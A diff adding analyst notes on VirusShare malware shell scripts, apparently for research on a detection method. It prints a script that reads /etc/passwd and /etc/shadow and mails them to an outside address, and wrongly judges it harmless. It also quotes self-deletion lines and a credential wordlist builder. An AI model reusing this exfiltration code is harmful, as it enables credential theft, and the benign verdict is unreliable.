@@ -962,6 +962,249 @@ This script looks totally OK. It looks like this script is installing some progr
 That is, it does not download, not remove, not propagate.
 
 
+-------------------------------------------------------
+
+# VirusShare_de41dc9ccf3ea024a856f8cfb2399440.sh 
+
+This seems to be for Mac OS. 
+
+## Summary
+1. Change ownership recursively on `/Library/InputManagers/CTLoader`
+2. change exe permission for `/Library/InputManagers/CTLoader/`
+
+
+-------------------------------------------------------
+
+# VirusShare_15643b394919f1dd4f7cc55aa1c48a9f.sh 
+
+This may cause a false negative to our method.
+
+## Summary
+This scrip looks like only checking the OS version and then execute binary accordingly. 
+1. If OS unknown, execute `./bscan`
+2. If OS is RehHat 7.0, execute `./lpd`. 
+
+
+## Notes
+1. According to the `echo` content, I can see "buffer overflow"
+2. `./fp`, `./bscan`, and `./lpd` are three binaries that execute, but I cannot know what are they. 
+3. This indicate that our work may have limitation. Because we only check the Linux commands. For those do not rely on Linux command to infect, we cannot distinguish easily. 
+
+
+
+-------------------------------------------------------
+
+# VirusShare_ec5c2d05ea7cf5061d757ccb031f4a7e.sh 
+
+This is an infection script that avoids meeting the minimum infection pattern. So this could cause false negative to our method. 
+
+## Summary
+1. A for loop that downloads a list of binaries, change permission, execute. 
+
+## Notes
+1. If its not because of the name, It's a little bit unconfident for me to tell this is an infection script. 
+2. Only match the pattern: DW-CH-EXE. Obviously, this should not be enough evidence to claim an infection. However, this has more chance for the execution to be failed. And it leaves the downloaded binaries, which make the infection to be easily tracked. 
+
+
+
+-------------------------------------------------------
+
+# VirusShare_892ed5839e0324488266fbb74e077b6e.sh 
+
+## Summary
+A typical "boring" pattern. 
+
+
+## Notes
+It matches FP-DW-CH-EXE
+
+
+
+-------------------------------------------------------
+# VirusShare_0be540186031acdebf3ebff47333cea5.sh 
+
+This script looks totally fine. 
+**I doubt how this script is labeled as "virus" by virus total.**
+
+## Summary
+It runs the following commands to collect the network status and write those status to a file `/tmp/info`, and email this file to a host. 
+```
+/sbin/ifconfig > /tmp/info
+echo '==='>>/tmp/info
+hostname -f >> /tmp/info
+echo '==='>>/tmp/info
+cat /etc/passwd >>/tmp/info
+echo '==='>>/tmp/info
+cat /etc/shadow >>/tmp/info
+echo '==='>>/tmp/info
+ping -c 5 www.yahoo.com >>/tmp/info
+echo '==='>>/tmp/info
+echo 'Port si parola de ssh'>>/tmp/info
+echo '$1:$2:' >>/tmp/info
+echo '==='>>/tmp/info
+socklist >>/tmp/info >/dev/null 2>&1
+echo '==='>>/tmp/info
+cat /tmp/info | mail puidedrac@gmail.com -s 'invitation'
+```
+This code can present in any administrative script.
+
+
+## Notes
+I cannot see any suspicious for this script. 
+It can be employed by an administrator of the system to collect any network information and email this information to an email. 
+**So, it raises an important question: how can we ensure that our dataset is 100% accurate.**
+Because our knowledge is based on this dataset, unlike those using this dataset for evaluate purpose, if this dataset has any "inaccuracy", we have no way to reach an "accurate" conclusion. 
+
+----------------------------------------------------------
+
+# VirusShare_2811a3d57d37ad8e105c71db5b692cdf.sh 
+
+Almost the same as 
+> VirusShare_cfd699501ba0834cd88a1c79fd038fb1.sh
+
+For education purpose. 
+
+## Summary
+The only difference between this script and 
+> VirusShare_cfd699501ba0834cd88a1c79fd038fb1.sh 
+
+is that this script does not write anything to `/etc/shadow`. 
+
+
+
+---------------------------------------------------------------
+
+# VirusShare_615c08bb1acdf2f21490450991766187.sh
+
+This file is totally fine if we change the name of variables of this script. 
+
+**mistabel**
+
+## Summary
+The original code of this script.
+``` shell
+users=$1;
+pass=$2;
+
+if [ ! -f "$users" -o ! -f "$pass" ] ; then 
+    echo "File not found";
+    exit;
+fi
+
+rm -f pass_file
+for m_user in $(cat $users) ; do 
+    for m_pass in $(cat $pass) ; do 
+        echo "$m_user $m_pass" >>pass_file
+    done
+done
+```
+
+If we change the name of the variables
+
+``` shell
+book1=$1;
+book2=$2;
+
+if [ ! -f "$book1" -o ! -f "$book2" ] ; then 
+    echo "File not found";
+    exit;
+fi
+
+rm -f two_books
+for book1_chapter in $(cat $book1) ; do 
+    for book2_chapter in $(cat $book2) ; do 
+        echo "$book1_chapter $book2_chapter" >>two_books
+    done
+done
+```
+
+## Notes
+This script is totally fine if we change the name of the variables.
+
+
+------------------------------------------------------------
+
+# VirusShare_94bfedc1dd3a8e3760fca3229a573464.sh 
+
+## Summary
+1. Stops `iptables`
+2. Stops `SuSEfirewall2`
+3. Stops `reSuSEfirewall2`
+4. Removes some files, **including itself (`$0`)**.
+5. Check the existence of a specific process:
+ `45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z`. 
+6. If this process exists, kill a list of processes, remove a list of other files (including remove itself multiple times). 
+```shell
+rm -f /tmp/.httpdlog*.gz
+rm -f *.gz
+rm -f *.sh
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+```
+7. If that process does not exist, do the following. 
+1) create a dir at `/tmp/.httpdlog`
+2) go to the new dir
+3) download
+4) decompress (or unzip, untar, etc.)
+5) change permission
+6) remove the downloaded zip file
+7) execute the excutables
+8) remove itself
+
+
+## Notes
+This script does not remove the executables!!
+So it's another exception. 
+
+
+--------------------------------------------------------------
+
+# VirusShare_27515d028c3734d8a1f35bf48c20f877.sh 
+
+
+## Summary
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
